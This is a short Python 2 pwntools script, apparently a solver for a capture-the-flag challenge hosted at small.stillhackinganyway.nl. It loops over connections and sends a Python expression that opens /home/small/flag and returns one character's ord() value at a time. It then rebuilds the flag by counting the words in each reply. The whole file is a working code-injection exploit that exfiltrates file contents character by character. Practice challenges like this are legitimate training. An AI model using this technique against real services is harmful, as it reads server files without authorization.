#!/usr/bin/env python2
from pwn import *
#import socket

HOST='small.stillhackinganyway.nl'
PORT=1337


def countHack(hh) :
	return len(hh.split())

def solver() :
	i=0
	key=""
	while True:
		put ='ord(open("/home/small/flag","r").readline()[%d])'%i
		s = remote(HOST,PORT)
		print s.recv(1024)
		s.sendline(put)
		temp= s.recv()
		key = key+chr(countHack(temp))
		print key
		s.close()
		i = i+1

if __name__ == '__main__' :
    solver()

